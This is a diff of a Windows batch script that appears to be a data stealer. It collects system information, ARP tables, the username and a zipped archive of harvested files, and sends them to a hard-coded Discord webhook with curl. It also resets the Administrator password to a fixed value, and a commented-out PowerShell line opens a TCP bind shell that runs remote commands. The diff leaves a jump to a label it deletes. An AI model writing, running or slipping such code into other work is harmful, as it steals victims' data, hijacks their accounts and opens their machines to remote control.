@@ -12,16 +12,21 @@ start silent.vbs
 exit
 
 :silentFound
+systeminfo > systeminfo.txt
+arp -a > arp.txt
+for /f "delims=" %b in ('whoami') do set name=%b
+curl -F "file=@systeminfo.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
+curl -F "file=@arp.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
+net user ADMINISTRATOR DEFAULT1
 
 
 
-
-cd c:\bb
-
+cd C:\bb
 setlocal
 
-goto lol
-:lol2
+
+
+
 :: Set destination folder and zip path
 set "DEST_DIR=C:\bb"
 set "ZIP_PATH=%DEST_DIR%\collected_win_dat.zip"
@@ -62,16 +67,11 @@ echo Done. Files archived to: %ZIP_PATH%
 
 curl -F "file=@collected_win_dat.zip" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
 
-:lol
-cd bb
-systeminfo > systeminfo.txt
-arp -a > arp.txt
 
-net user ADMINISTRATOR DEFAULT1
 
-for /f "delims=" %b in ('whoami') do set name=%b
-curl -F "file=@systeminfo.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
-curl -F "file=@arp.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
+
+
+
 
 goto lol2
 :: powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',321099);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();$bytes = New-Object System.Byte[] 1024;$encoding = [System.Text.Encoding]::ASCII;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = $encoding.GetString($bytes, 0, $i);$sendback = (cmd /c "$data" 2>&1 | Out-String );$sendbackBytes = $encoding.GetBytes($sendback);$stream.Write($sendbackBytes, 0, $sendbackBytes.Length);$stream.Flush()};$client.Close();$listener.Stop()"
